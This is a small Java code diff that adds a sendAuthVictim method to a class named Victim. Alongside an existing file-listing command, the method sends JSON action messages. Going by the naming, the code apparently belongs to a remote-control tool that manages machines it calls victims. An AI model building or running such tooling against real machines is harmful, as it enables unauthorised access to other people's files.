@@ -18,6 +18,12 @@ public class Victim {
         this.owners = owners;
     }
 
+    public void sendAuthVictim() {
+        JSONObject query = new JSONObject();
+        query.put("action", "auth.victim");
+        sendMessage(query);
+    }
+
     public void sendGetFiles(String path, String owner) {
         JSONObject query = new JSONObject();
         query.put("action", "get.files");
